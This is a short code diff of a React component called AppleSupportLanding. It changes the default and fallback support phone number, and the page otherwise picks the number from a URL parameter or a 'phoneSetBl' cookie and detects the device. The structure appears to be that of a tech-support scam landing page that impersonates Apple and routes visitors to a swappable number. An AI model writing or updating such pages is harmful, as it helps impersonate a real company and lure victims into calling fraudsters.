@@ -43,7 +43,7 @@ const cookieHelper = {
 };
 
 const AppleSupportLanding = () => {
-  const [phone, setPhone] = useState('+1(866)557-3465');
+  const [phone, setPhone] = useState('+1(888)339-5615');
   const [displayText, setDisplayText] = useState('');
   const resultRef = useRef(null);
 
@@ -66,7 +66,7 @@ const AppleSupportLanding = () => {
     // 1. Phone Resolution
     const paramPhone = urlParams.get('phone');
     const cookiePhone = cookieHelper.get('phoneSetBl');
-    const activePhone = cookiePhone || paramPhone || '+1(866)557-3465';
+    const activePhone = cookiePhone || paramPhone || '+1(888)339-5615';
     setPhone(activePhone);
 
     // 2. Device Detection
